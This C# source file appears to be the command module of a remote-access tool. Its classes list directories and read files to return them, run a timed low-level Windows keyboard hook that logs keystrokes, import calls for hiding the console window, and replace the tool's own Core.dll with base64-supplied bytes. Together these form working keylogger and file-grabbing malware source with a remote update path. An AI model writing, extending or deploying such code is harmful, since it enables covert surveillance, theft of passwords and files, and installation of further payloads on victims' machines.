using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.Serialization.Formatters.Binary;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Threading;

namespace Core
{
    [Serializable]
    public class Command
    {
        public string TaskID { get; }
        protected string executionArgument;
        
        public Command(string TaskID, string executionArgument)
        {
            this.TaskID = TaskID;
            this.executionArgument = executionArgument;
        }
        public virtual Result Execute()
        {
            throw new NotImplementedException();
        }
    }

    [Serializable]
    public class PingCommand : Command
    {
        public PingCommand(string TaskID) : base(TaskID,null) { }

        public override Result Execute()
        {
            Console.WriteLine("Ping Command!");
            return new Result(TaskID);
        }
    }

    [Serializable]
    public class GetFilesListCommand : Command
    {
        public GetFilesListCommand(string TaskID, string executionArgument) : base(TaskID, executionArgument) { }

        public override Result Execute()
        {
            Console.WriteLine("GetFilesList Command!");

            List<string> fileList;
            if (Directory.Exists(executionArgument))
            {
                fileList = new List<string>(Directory.GetFiles(executionArgument));
                return new Result(TaskID, fileList);
            }
            return new Result(TaskID, "Failed to find requested directory.\nPath: " + executionArgument);
        }
    }

    [Serializable]
    public class GetFileCommand : Command
    {
        public GetFileCommand(string TaskID, string executionArgument) : base(TaskID, executionArgument) { }

        public override Result Execute()
        {
            Console.WriteLine("GetFileCommand Command!");

            byte[] file;
            if (File.Exists(executionArgument))
            {
                file = File.ReadAllBytes(executionArgument);
                return new Result(TaskID, file);
            }
            return new Result(TaskID,"Failed to find requested file.\nPath: " + executionArgument);
        }
    }

    [Serializable]
    public class KeyLogCommand : Command
    {
        public KeyLogCommand(string TaskID, string executionArgument) : base(TaskID,executionArgument) { }

        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;
        private static List<string> log;
        public override Result Execute()
        {
            Console.WriteLine("KeyLogCommand Command!");

            log = new List<string>();

            _hookID = SetHook(_proc);
            
            System.Threading.Thread timeout = new System.Threading.Thread(() =>
            {
                System.Threading.Thread.Sleep(int.Parse(executionArgument));
                Application.Exit();
                Console.WriteLine("Done KeyLog");
            });
            timeout.Start();
            Application.Run();
            UnhookWindowsHookEx(_hookID);
            
            return new Result(TaskID, log);
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                log.Add(((Keys)vkCode).ToString());
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        //These Dll's will handle the hooks.
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,
            LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        // The two dll imports below will handle the window hiding.
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
    }

    [Serializable]
    public class UpgradeCommand : Command
    {
        public UpgradeCommand(string TaskID, string executionArgument) : base(TaskID, executionArgument) { }

        public override Result Execute()
        {
            Console.WriteLine("Upgrade command!");
            byte[] upgradeDll = Convert.FromBase64String(executionArgument);
            File.Create("NewCore.dll").Write(upgradeDll,0,upgradeDll.Length);
            Thread overrideCore = new Thread(() => 
            {
                bool canBeWriten = false;
                FileStream coreFile = null;
                while (!canBeWriten)
                {
                    Thread.Sleep(200); //wait between tries
                    try
                    {
                        coreFile = File.OpenWrite("Core.dll"); //try to open core file
                    }
                    catch (Exception)
                    {
                        continue; //if failed to open core file try again
                    }
                    coreFile.Close(); //if success close the opened file
                    canBeWriten = true; //end loop
                }
                File.Replace("NewCore.dll", "Core.dll", "Core.dll.backup", true);
            });
            overrideCore.Start(upgradeDll);
            throw new UpgradeException();
        }
    }

    public class UpgradeException : Exception
    {
        public override string Message => "Restart program to upgrade dll";
    }
}
